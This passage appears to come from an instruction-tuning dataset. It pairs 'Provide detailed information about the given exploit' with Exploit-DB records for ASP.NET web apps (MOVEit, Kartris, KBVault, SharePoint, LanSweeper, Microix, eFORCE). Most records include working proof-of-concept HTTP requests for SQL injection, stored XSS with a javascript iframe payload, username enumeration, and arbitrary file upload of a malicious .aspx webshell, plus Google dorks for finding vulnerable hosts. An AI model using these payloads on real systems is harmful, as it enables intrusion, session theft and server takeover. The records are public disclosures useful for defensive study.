            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# # # # #\n# Exploit Title: Real Estate Marketplace Site ASP.NET Script 1.1 - SQL Injection\n# Dork: N/A\n# Date: 13.09.2017\n# Vendor Homepage: http://www.icloudcenter.com/\n# Software Link: http://www.icloudcenter.com/real-estate-marketplace-site.htm\n# Demo: http://www.icloudcenter.com/demos/icestatemarket/\n# Version: 1.1\n# Category: Webapps\n# Tested on: WiN7_x64/KaLiLinuX_x64\n# CVE: N/A\n# # # # #\n# Exploit Author: Ihsan Sencan\n# Author Web: http://ihsan.net\n# Author Social: @ihsansencan\n# # # # #\n# Description:\n# The vulnerability allows an attacker to inject sql commands....\n#\n# Proof of Concept:\n#\n# http://localhost/[PATH]/details.aspx?id=[SQL]\n#\n# Etc..\n# # # # #"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50164",
        "output": {
            "ID": "50164",
            "File": "exploits/aspx/webapps/50164.txt",
            "Description": "IntelliChoice eFORCE Software Suite 2.5.9 - Username Enumeration",
            "Date Published": "2021-07-29",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-07-29",
            "Date Updated": "2021-07-29",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: IntelliChoice eFORCE Software Suite 2.5.9 - Username Enumeration\n# Date: 03.05.2021\n# Exploit Author: LiquidWorm\n# Vendor Homepage: https://www.eforcesoftware.com\n\nIntelliChoice eFORCE Software Suite v2.5.9 Username Enumeration\n\n\nVendor: IntelliChoice, Inc.\nProduct web page: https://www.eforcesoftware.com\nAffected version: 2.5.9.6\n                  2.5.9.5\n                  2.5.9.3\n                  2.5.9.2\n                  2.5.9.1\n                  2.5.8.0\n                  2.5.7.20\n                  2.5.7.18\n                  2.5.6.18\n                  2.5.4.6\n                  2.5.3.11\n\nSummary: IntelliChoice is a United States software company that was\nfounded in 2003, and offers a software title called eFORCE Software\nSuite. eFORCE Software Suite is law enforcement software, and includes\nfeatures such as case management, court management, crime scene management,\ncriminal database, dispatching, evidence management, field reporting,\nscheduling, court management integration, certification management,\nand incident mapping. With regards to system requirements, eFORCE\nSoftware Suite is available as SaaS, Windows, iPhone, and iPad software.\n\nDesc: The weakness is caused due to the login script and how it verifies\nprovided credentials. Attacker can use this weakness to enumerate valid\nusers on the affected application via 'ctl00$MainContent$UserName' POST\nparameter.\n\nTested on: Microsoft-IIS/10.0\n           Microsoft-IIS/8.5\n           ASP.NET/4.0.30319\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2021-5658\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5658.php\n\n\n03.05.2021\n\n--\n\n\nRequest/response for existent username:\n---------------------------------------\n\nPOST /eFORCECommand/Account/Login.aspx HTTP/1.1\n\n__LASTFOCUS:\n__EVENTTARGET:\n__EVENTARGUMENT:\n__VIEWSTATE: Xxx\n__VIEWSTATEGENERATOR: 4A5A1A0F\n__EVENTVALIDATION: Xxx\nctl00$MainContent$UserName: eforce\nctl00$MainContent$Password: 123456\nctl00$MainContent$btnLogin.x: 20\nctl00$MainContent$btnLogin.y: 7\n\n\nResponse:\nInvalid password entered for username eforce.\n\n\n\nRequest/response for non-existent username:\n-------------------------------------------\n\nPOST /eFORCECommand/Account/Login.aspx HTTP/1.1\n\n__LASTFOCUS:\n__EVENTTARGET:\n__EVENTARGUMENT:\n__VIEWSTATE: Xxx\n__VIEWSTATEGENERATOR: 4A5A1A0F\n__EVENTVALIDATION: Xxx\nctl00$MainContent$UserName: testingus\nctl00$MainContent$Password: 123456\nctl00$MainContent$btnLogin.x: 20\nctl00$MainContent$btnLogin.y: 7\n\n\nResponse:\nUnable to login: User name testingus is not registered."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43947",
        "output": {
            "ID": "43947",
            "File": "exploits/aspx/webapps/43947.txt",
            "Description": "IPSwitch MOVEit 8.1 < 9.4 - Cross-Site Scripting",
            "Date Published": "2018-02-02",
            "Author": "1n3",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2018-02-02",
            "Date Updated": "2018-02-02",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: IPSwitch MoveIt Stored Cross Site Scripting (XSS)\n# Date: 1-31-2017\n# Software Link: https://www.ipswitch.com/moveit\n# Affected Version: 8.1-9.4 (only confirmed on 8.1 but other versions prior to 9.5 may also be vulnerable)\n# Exploit Author: 1N3@CrowdShield - https://crowdshield.com (Early Warning Security)\n# Contact: https://twitter.com/crowdshield\n# Vendor Homepage: https://www.ipswitch.com\n# Category: Webapps\n# Attack Type: Remote\n# Impact: Data/Cookie Theft\n\n\n1. Description\n\nIPSwitch MoveIt v8.1 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. Attackers can leverage this vulnerability to send malicious messages to other users in order to steal session cookies and launch client-side attacks.\n\n\n2. Proof of Concept\n\nThe vulnerability lies in the Send Message -> Body Text Area input field.\n\nPOST /human.aspx?r=692492538 HTTP/1.1\nHost: host.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nReferer: https://host.com/human.aspx?r=510324925\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 598\n\nczf=9c9e7b2a9c9e7b2a9c9e7b2a9c9e7b2a9c066e4aee81bf97f581826d8c093953d82d2b692be5490ece13e6b23f1ad09bda751db1444981eb029d2427175f9906&server=host.com&url=%2Fhuman.aspx&instid=2784&customwizlogoenabled=0&customwiznameup=&customwizzipnameup=%5Bdefault%5D&transaction=secmsgpost&csrftoken=1a9cc0f7aa7ee2d9e0059d6b01da48b69a14669d&curuser=kuxt36r50uhg0sXX&arg12=secmsgcompose&Arg02=&Arg03=452565093&Arg05=edit&Arg07=forward&Arg09=&Arg10=&opt06=&Opt08=&opt01=username&opt02=&opt03=&arg01=FW%3A+test&Opt12=1&arg04=<iframe/src=javascript:alert(1)>&attachment=&opt07=1&arg05_Send=Send\n\n\n3. Solution:\n\nUpdate to version 9.5\n\n\n4. Disclosure Timeline\n\n1/30/2017 - Disclosed details of vulnerability to IPSwitch.\n1/31/2017 - IPSwitch confirmed the vulnerability and verified the fix as of version 9.5 and approved public disclosure of the vulnerability."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48445",
        "output": {
            "ID": "48445",
            "File": "exploits/aspx/webapps/48445.txt",
            "Description": "Kartris 1.6 - Arbitrary File Upload",
            "Date Published": "2020-05-11",
            "Author": "Nhat Ha",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2020-05-11",
            "Date Updated": "2020-05-11",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Kartris 1.6 - Arbitrary File Upload\n# Dork: N/A\n# Date: 2020-05-08\n# Exploit Author: Nhat Ha - Sun CSR\n# Vendor Homepage: https://www.cactusoft.com/\n# Software Link: https://www.kartris.com/\n# Version: 1.6\n# Category: Webapps\n# Tested on: WiN10_x64/KaLiLinuX_x64\n# CVE: N/A\n\n# POC: https://localhost/Admin/_GeneralFiles.aspx\n#\nPOST /Admin/_GeneralFiles.aspx HTTP/1.1\nHost: 192.168.1.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101\nFirefox/76.0\nAccept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data;\nboundary=---------------------------9604487443072642880454762058\nContent-Length: 18484\nOrigin: 192.168.1.1\nConnection: close\nReferer: https://192.168.1.1/Admin/_GeneralFiles.aspx\nCookie: __cfduid=d1e56d596943226c869a1186e06b8d8661588757096;\nASP.NET_SessionId=abbnm4jh04wmdbl2gukr5t5w;\nKartrisBasket870c8=s=7i7lpj21819; KartrisBackAuth870c8=xxxxxxxxxxxxx\nUpgrade-Insecure-Requests: 1\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"scrManager_HiddenField\"\n\n;;AjaxControlToolkit, Version=4.1.7.123, Culture=neutral,\nPublicKeyToken=28f01b0e84b6d53e:en-GB:57898466-f347-4e5c-9527-24f201596811:475a4ef5:5546a2b:d2e10b12:effe2a26:37e2e5c9:1d3ed089:751cdd15:dfad98a5:497ef277:a43b07eb:3cf12cf1;\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data;\nname=\"_UC_CategoryMenu_tvwCategory_ExpandState\"\n\ncccccccccc\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data;\nname=\"_UC_CategoryMenu_tvwCategory_SelectedNode\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data;\nname=\"_UC_CategoryMenu_tvwCategory_PopulateLog\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$scrManager\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$_UC_AdminSearch$txtSearch\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$phdMain$hidFileNameToDelete\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$phdMain$filUploader\";\nfilename=\"malicious.aspx\"\nContent-Type: text/plain\n\n[Content Malicious File Here ! ]\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$splMainPage$hdnWidth\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$splMainPage$hdnMinWidth\"\n\n170px\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"ctl00$splMainPage$hdnMaxWidth\"\n\n500px\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"__EVENTTARGET\"\n\nctl00$phdMain$lnkUpload\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"__EVENTARGUMENT\"\n\n\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"__VIEWSTATE\"\n\ne7mz4HjQ0AEu2oVGr99HokgmHrtNlEBdbc12UCNvf2ecqRUmHfMSRA/o+piDRnkK+JKX42guSLqv4H9AAyfxyGHXy9Fp+YNNlTkKJKZOr9IEDBQM4j8rg8z1mY+Qb07KMfjXb3Kb3eWY9h1gbNfMp4FfrUwQ8+VK6PsePv/PlUGVxO5ATLid4hQrm0fx05VPLdFkZgXBN+LuVist3AgQ70Vwg7OKplisMzMZ4711SJ8zG9jUIqzEJ3uF96bgeX4kNBqURJdAsj7uKIY8JyWAmMXNNb5++Pkhvskrz+yLK9oSi3tYaJC0gF2aaOEc5LQ8pIsyhyRgu1DZeSitAZLnv757cJDtQbzdu7dbLH4U5fACFJ27xz1v5WyMATh/aWEy+hsN6dyPsciVilaFqpVIEFDD7ZRtLZ6G6EtSuudqc2bDfmh1RfdgtLQ3GWvWl7xKw0SgZypnrjDH4cb3MPbg+iDHaMkhmXiAsf0iTiZPGQT5B683rILYwqd5KQa2zyBmGN+UFeTw2FBmmmZhtKtzZPDGQGH6oFTt5dMdqPOY51Db7DYVsP1MevbMmtHO8u+i7lwqeMnx24uWrAkxoflbTMn7NWxVtHHGqiHvAluibF3MzKl7NMAvlL0fkqbp1Oa+yqxU8Eb81jkClc2DhVAqz1Jijz7wBdJBmu6YlgCx3jkrvFynwIPPDdnq8/4+rLAxzg1VJcrJgjsVR6kJquXxT/VdotOrecDgJJjF5SJ8lx+zqa98Fk6/jLpCKv8PMKXP22zqpkIJBuLeRMBghxRDUXz9ifreEC5krJqeZ45lWchfRqXAzAU6fBanYwDn3RksQ72Op0lOV9HyJS4Jcqv+JsD/yUw3lByEAoWg97QsQA65CJGvL49B8Ht6cl0sh80mXhXaDCEEiFEUdDnePFjQN3ZNBf7PVBvjXZ4zuI/KV5sfFHfBj8qdTM9wndVOCjqrFHF4i39GQqwYfij3i0a3W3wm7Tx7W1Yg/5wiUzyp5BPR0mpAdYgiUcx6CcHSwCgRR0dVRL8W7P6OqbSxoOaNkqkdQe0jPCU/muWd5X+7VknR0EvDecbPISQ0ZfwPgQfQIFKzz5VrFWGxUyV02teMa4R06qmGLGJbhLUk+2b327VKz4vOaTsb707bS6BcqFXfYa+h/sp3ABZ7JRpzoO0huWgZoquQ4HIl4lOaJ116o+T+6ReFWWAadkYb54j2mTGTv2NuR57RmUSBGVdKqIsnOpPmCFaBP89McSKQNgddy169evwP6h3iUWD9apVvrncVBEkZ6mIbnPYasVjlytKkDhiEKVCiXfm6D/KxH1FCqC5KtM4PcpcCZqxdliiL61Q+EGTMORN5NiRBHUjNjnjg+/5A58Z57UONK/MuUZpxjcn4d0tS6eRp+jBZAmAC3vslNxC1tLWkmerB+gBVsiQYPpP+Keawsx4z/Dd+yqJZBOP5kxSxkItcBYxDL1yYZR6aYOqdRUHB2ZH91OZxLFLXWg8AcCmvHV/0SOjfsXZq8P+Q1yv2MUutBjiN36gEZgjRjdNVpO86zK1MCVLO1XQia1uSzjJAr5TbZjmSRiYcsJiRnvmXpAwdJYPjOXKu0s+9Y/9sH94WvLaoI51DwH91rRMt+4EMCImWZwyfIOJxiJeBuMjOwrmsFNA3VzElpvOeqG82jbu2MFZfsD17AXbJHnPlGeOTkDgngZIHrJLDjo9p7930AE9Cg0bw9hvAcrUe4r9bEHaz5JIgwrsAGqGTcbjzheyaeODjxw12BJpIUt0aPxi/LZR7JtvNBkym1RedH8ewfeDcVPqlWFdO5rJ+wABeuFFVIkW6zdc4xM24bYX3gq5mNL3wVT3CoDatZFbZz2CgJB9ZDDa3f0CrWGK7hdTDQ4vF1OUaJB+JZMiKg5H6Ro+JoSK8UI3WcVkStgNA0SMHT2ujLMwDmOeNsdvhQ3OOnoFvZTFsFQI4D6LrZ5GHrIlQTZPyVQrwc19854TfhinQeVbPET2G2ppkjllnYBelPcCUQ2TdPNL7eW+BkGga391OiDAaHBV25tIkKT4iIoVPYfY2h+PmvU5wxGB+i4MXZaMNCLlv4/gI/FXekKbLTCWkp0lslul4QRHHHVcrbTJVnKme2UyhgTqWpA6JvxyKPzmrogcGZ7+5pHf5gFwhgKj/POURU8Z4QqbUfNNuO1lnyfgH0Wy4ho0WQoJ6VFpT2gqvOSok64UYnF3qiNgdTfP3k6BzGbrG/zQtjtgYCRjeNRsLPeoyRg9UbO6aigmfYSD6PrDKsI5bjl2ceJsAnmCFpiaqxaSVflwzUSvZA5FNyotg/pHlH165sKxR+wQPFyr8HDmE9qiMsRoU3xJz6k+XT1CEMpf0x6TVWDMoC/Ddo/zjA3wxpedwutGubsn1757KgZ+V9McXa3c0LvCW6UkIiax+czNOaG5mu7KAgwgwpHoRz9n0Bg6Di30dQlsT1yYsw4uEqLmdYkaF1LtFNl8gRPibgd/iBlq1fYXGUtCrMA8wMxQh9Z9VCFi0crq2Wi4xvOlyO+eC7Mzh12nMsUyTX0x7DkTj7F3rGNX7pRbq03ellq+XhDNmgmbLggVoGnPSYbTLyjFzZcW+iJci8xXN2ps6rhaq4ETgXuj92RtPiEpIh5TaAB2jAjobflwugihC+2AsSxyVyRHNsB999mGS6C5FrGfkk/1tV/xFS9dK8TQ7IDPECykq1hjnzvVjv4i7NJJ/2RoXCSjOMYWeO0ayJes5Ra1NMYm0NlAJWUSlqA3xQWtdC//n1Nfm6HkRm/h2zLHQZ7T/+xIGuuE9lLp21KLXNXXVDGB8rf+qgRxpUOb8B3vnrZwkOEFD2q29sfo9PwIetVBKoiELaSD61JIYmyjV2omPw89r0VTuEnGOzztf71U1UAZqgY6qD0xFRjIZa1hzxljEmWNsRQlxl7ys4AMKd3lDCbzESzcpzw9bX9uC5BOtZwMKOh9XwOuv6PPxUZXRzOYkbALq51ft3nTgQvFqs/NNPuLlL8JRlfOB0CRNrs93LXbEb69DUtiBtgYVnn3dCxl8ok6TJkIwfnsYDfluyGQtvlHk9GMdwUZbTXHBf6FmJ5+0nnp434HwA0Q4RMBmqb1xXVBCP2+ZU9O0qigIeBivgzgatxw3qi6bSMt/Fn6zPrgHeFDisttaETZ3DyW9FfE75RHBOOS+qjTLunUwwu/ApwgjjBOgwtF6v9JcZh380H6jnXKXt99VEhceSazy3grAesIb3P39XVvt7NQEojdlO8GYTHi8Hko7rnwaSjhw2avvwmLlZGGo6imld3Jt7+Qu03d13oFZOuGOuOlG+JzRMdbSj+Hjd8Jz9RolOOrEKPaiFnWF4n/yxIQRnzZKAQcwpboyTE0kDki0/raVRAR9mIgf9g6AVOdeQM6tGOQ5v1m6oAyIhgA69/m3KiTZZ90GVUaaR7pmtrSxX+zZaHILXVlvnK3GZJEBoIVuwkbfskcK/fLG4IOUaHHX4MOoJZ0lYijPamlUMIwkD/bcomrOX4Og26rzgGui8kFFNkRYq8q59lhsXDasbUOOspBQNKfnKQRa0FQEWOHmEtdGmQ3IKiIHXWrlitE3UHHww0RlWqDrCIoQ9mchQ4KK40vFj3sj39bG5MsoWxE4aqCgTtkjAPLbnUameCQXDm7t19fbqjd1tqsQPo6H61AWO+sEcH1avdS7mV9DSsbRXvcb7onkQKC14AUrEngCITIP9J5Gn+OAT6cNxttnjk3zlmWWnNnloo6q8rrB34f/WTdgq+P9hLQQdraiSfnEd4WWfDf98LYAQknYIX93paZh3scf7z5C1fkfhdIEIWnLXdmAeJKC5nQMaLkgFGhlcZ8NBD8PUqZ4S1Xlii1otppvVsUGobV5Tip8Jw2Sm4JyFlB3oiA9VPdhsAisRRtVo+cplwyyqLLv9mnr5qtqdueAA72lUExI75H8wkd1BWrvSQdwDKTCMEAXwDebTHNlEADWPzSI/Cxjyb7h//QqdPJ/Yt8T+DcvUY1jPeth6tgKtY6Gz3UdqwoPNVqs0+EL2QqPaGWN+tXKAjxXKZhT3MdLRHUkjsk5sItPzR1iO++3UCYsXM8tbZQEXDx8bTos+33AZfIvHaqRWgQX9l3ZTeqbWOYkp8DPkfRfC9urTwEnYz2SjOrKihI5v7FNyk5bTBEfHYYqV4cyCDVRafFXh6HLlE4WXGHofEhew89WVnNcs3EwuruvDf5JKeczEk0yHM+RuLMTIF9S8e3aAENPscM/pqD4J/PgccRriGsyzCNlGJB7+ZtOfPqWTMwPuO/ut+uhxNqZEUozmWfg++DrddTAY7D2+toFsGfE+f4tw2uCb+p+prkTHpZ866ApH6XvFOP8DYI3oGJ00g532SeTLUF5S/ChdlfH37BYlvuQkiWxf1D9sMHTokbhHZaqdIosPCLf2FSHZ+ODvqKZ+zUpvHijLtPGSLkZmWVNO625cefzLh2nAD/YTApDLLvh2T7m+wVMXlPp17HC3q6CjO05//k=\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"__VIEWSTATEGENERATOR\"\n\n54DD7DF0\n-----------------------------9604487443072642880454762058\nContent-Disposition: form-data; name=\"__VIEWSTATEENCRYPTED\"\n\n\n-----------------------------9604487443072642880454762058--\n\n\n# Access malicious file following the link:\nhttps://localhost/uploads/General/malicious.aspx\n# How to fix: Update the latest version\n# Commit fix:\nhttps://github.com/cactusoft/kartris/commit/e9450dc1f90aa6167f1db1a6f137ea07cacb2a5c"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42184",
        "output": {
            "ID": "42184",
            "File": "exploits/aspx/webapps/42184.txt",
            "Description": "KBVault MySQL 0.16a - Arbitrary File Upload",
            "Date Published": "2017-06-14",
            "Author": "Fatih Emiral",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-06-16",
            "Date Updated": "2017-06-16",
            "Verified": "0",
            "Codes": [
                "CVE-2017-9602"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comV0.16.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: [KBVault MySQL v0.16a - Unauthenticated File Upload to Run Code]\n# Google Dork: [inurl:\"FileExplorer/Explorer.aspx\"]\n# Date: [2017-06-14]\n# Exploit Author: [Fatih Emiral]\n# Vendor Homepage: [http://kbvaultmysql.codeplex.com/]\n# Software Link: [http://kbvaultmysql.codeplex.com/downloads/get/858806]\n# Version: [0.16a]\n# Tested on: [Windows 7 (applicable to all Windows platforms)]\n# CVE : [CVE-2017-9602]\n\n1. Description\n\nKBVault Mysql Free Knowledge Base application package comes with a third party file management component. An unauthenticated user can access the file upload (and delete) functionality using the following URI:\n\nhttp://host/FileExplorer/Explorer.aspx?id=/Uploads\n\n2. Exploit\n\nThrough this functionality a user can upload an ASPX script to run any arbitrary code, e.g.:\n\nhttp://host/Uploads/Documents/cmd.aspx\n\n3. Solution\n\nUnauthenticated access to the file management function should be prohibited.\nFile uploads should be checked against executable formats, and only acceptable file types should be allowed to upload.\n\n4. Disclosure Timeline\n\n2017-06-09: Vendor notification\n2017-06-09: Vendor responded with intention to fix the vulnerability\n2017-06-12: CVE number acquired\n2017-06-15: Public disclosure"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 43149",
        "output": {
            "ID": "43149",
            "File": "exploits/aspx/webapps/43149.txt",
            "Description": "LanSweeper 6.0.100.75 - Cross-Site Scripting",
            "Date Published": "2017-11-16",
            "Author": "Miguel Mendez Z",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2017-11-16",
            "Date Updated": "2017-11-16",
            "Verified": "0",
            "Codes": [
                "CVE-2017-16841"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "LanSweeper - Cross Site Scripting and HTMLi\n\nTitle: Vulnerability in LanSweeper\nDate: 16-11-2017\nStatus: Vendor contacted, patch available\nAuthor: Miguel Mendez Z\nVendor Homepage: http://www.lansweeper.com\nVersion: 6.0.100.75\nCVE: CVE-2017-16841\n\nVulnerability description -------------------------\n\nLanSweeper 6.0.100.75 has XSS via the description parameter to \"/Calendar/CalendarActions.aspx\".\nTake control of the browser using the xss shell or perform malware attacks on users.\n\nVulnerable variable:\n--------------------\n\n\"http://victim.com/Calendar/CalendarActions.aspx?action=scheduleinfo&id=2&__VIEWSTATE=&title=Test+Lansweeper&description=XSS/HTMLI&type=1&startdate=13/10/2017&txtStart=19:30&enddate=13/10/2017&txtEnd=21:30&reminder=15&repeattype=1&amount=1&repeatby=0&monthday=1&monthweekday=1&monthweekdayday=1&ends=1&occurrences=15&repeatenddate=&agents={\"14\":{\"id\":14,\"editAllowed\":true}}&teams=&delete=false\"\n\n\"http://victim.com/Scanning/report.aspx?det=web50accessdeniederrors&title=XSS/HTMLI\"\n\n\"http://victim.com/Software/report.aspx?det=XSS/HTMLI&title=Linux Software\"\n\n\nPoc:\n----\nhttps://www.youtube.com/watch?v=u213EqTSsXQ"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 40407",
        "output": {
            "ID": "40407",
            "File": "exploits/aspx/webapps/40407.txt",
            "Description": "Microix Timesheet Module - SQL Injection",
            "Date Published": "2016-09-22",
            "Author": "Anthony Cole",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2016-09-22",
            "Date Updated": "2016-09-22",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Microix timesheet module SQL Injection\n# Google Dork: \"Copyright by Microix\" inurl:\"/microixcloud/\"\n# Date: 2016-09-06\n# Software Link: http://www.microix.net/workflow-modules/timesheet-module/\n# Exploit Author: Anthony Cole\n# Contact: http://twitter.com/acole76\n# Website: http://www.3fforensics.com/\n# CVE:\n# Category: webapps\n\n1. Description\n\nMicroix timeclock is vulnerable to a SQL injection.  The field that is injectable is:\n\nctl00$ctl00$ASPxCallbackPanel1Root$ASPxSplitter1$Content$ASPxSplitter2$Content2$ASPxRoundPanel1$ASPxCallbackPanel1$txtUserIDOrBadgeID\n\nInitial contact attempt: 08/22/2016\n2nd attempt: 08/29/2016\n3rd attempt: 09/05/2016\n4th attempt: 09/21/2016\n\n2. Proof of Concept\n\nPOST /microixcloud/ HTTP/1.1\nCache-Control: no-cache\nContent-Type: application/x-www-form-urlencoded\n\n__VIEWSTATE=&ctl00%24ctl00%24ASPxCallbackPanel1Root%24ASPxSplitter1%24Content%24ASPxSplitter2%24Content2%24ASPxRoundPanel1%24ASPxCallbackPanel1%24txtUserIDOrBadgeID=SQLi&ctl00%24ctl00%24ASPxCallbackPanel1Root%24ASPxSplitter1%24Content%24ASPxSplitter2%24Content2%24ASPxRoundPanel1%24ASPxCallbackPanel1%24txtPassword=asdsadsad&__CALLBACKID=ctl00%24ctl00%24ASPxCallbackPanel1Root%24ASPxSplitter1%24Content%24ASPxSplitter2%24Content2%24ASPxRoundPanel1%24ASPxCallbackPanel1&__CALLBACKPARAM=c0%3ALogin\n\n\n3. Solution:\nNone"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47417",
        "output": {
            "ID": "47417",
            "File": "exploits/aspx/webapps/47417.txt",
            "Description": "Microsoft SharePoint 2013 SP1 - 'DestinationFolder' Persistant Cross-Site Scripting",
            "Date Published": "2019-09-25",
            "Author": "Davide Cioccia",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2019-09-25",
            "Date Updated": "2019-09-25",
            "Verified": "0",
            "Codes": [
                "CVE-2019-1262"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Microsoft SharePoint 2013 SP1 - 'DestinationFolder' Persistent Cross-Site Scripting\n# Author: Davide Cioccia\n# Discovery Date: 2019-09-25\n# Vendor Homepage: https://www.microsoft.com\n# Software Link: https://support.microsoft.com/en-us/help/2880552/description-of-microsoft-sharepoint-server-2013-service-pack-1-sp1\n# Tested Version: SP1\n# Tested on: Microsoft Windows Server 2016\n# CVE: CVE-2019-1262\n# Advisory ID: ZSL-2019-5533\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5533.php\n# MSRC: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1262\n\nVendor: Microsoft Corporation\nProduct web page: https://www.microsoft.com\nAffected version: 2013 SP1\n\nSummary: SharePoint is a web-based collaborative platform that\nintegrates with Microsoft Office. Launched in 2001, SharePoint\nis primarily sold as a document management and storage system,\nbut the product is highly configurable and usage varies substantially\namong organizations.\n\nDesc: A cross-site-scripting (XSS) vulnerability exists when Microsoft\nSharePoint Server does not properly sanitize a specially crafted web\nrequest to an affected SharePoint server. An authenticated attacker\ncould exploit the vulnerability by sending a specially crafted request\nto an affected SharePoint server. The attacker who successfully exploited\nthe vulnerability could then perform cross-site scripting attacks on\naffected systems and run script in the security context of the current\nuser. The attacks could allow the attacker to read content that the\nattacker is not authorized to read, use the victim's identity to take\nactions on the SharePoint site on behalf of the user, such as change\npermissions and delete content, and inject malicious content in the\nbrowser of the user.\n\nSharepoint 2013 SP1 allows users to upload files to the platform, but\ndoes not correctly sanitize the filename when the files are listed. An\nauthenticated user that has the rights to upload files to the SharePoint\nplatform, is able to exploit a Stored Cross-Site Scripting vulnerability\nin the filename. The filename is reflected in the attribute 'aria-label'\nof the following HTML tag.\n\n# PoC request:\n\n\nPOST /FOLDER/_layouts/15/Upload.aspx?List={689D112C-BDAA-4B05-B0CB-0DFB36CF0649}&RootFolder=&IsDlg=1 HTTP/1.1\nHost: vulnerable_sharepoint_2013\nConnection: close\nContent-Length: 31337\nCache-Control: max-age=0\nAuthorization: Negotiate YIIV9gYGKwYBBQUCo........................JBAq39IdJh3yphI1uHbz/jbQ==\nOrigin: https://vulnerable_sharepoint_2013.tld\nUpgrade-Insecure-Requests: 1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryewNI1MC6qaHDB50n\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\nSec-Fetch-Mode: nested-navigate\nSec-Fetch-User: ?1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\nSec-Fetch-Site: same-origin\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,nl;q=0.6\nCookie: ...\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; name=\"MSOWebPartPage_PostbackSource\"\n\n\n------WebKitFormBoundaryewNI1MC6qaHDB50n\nContent-Disposition: form-data; 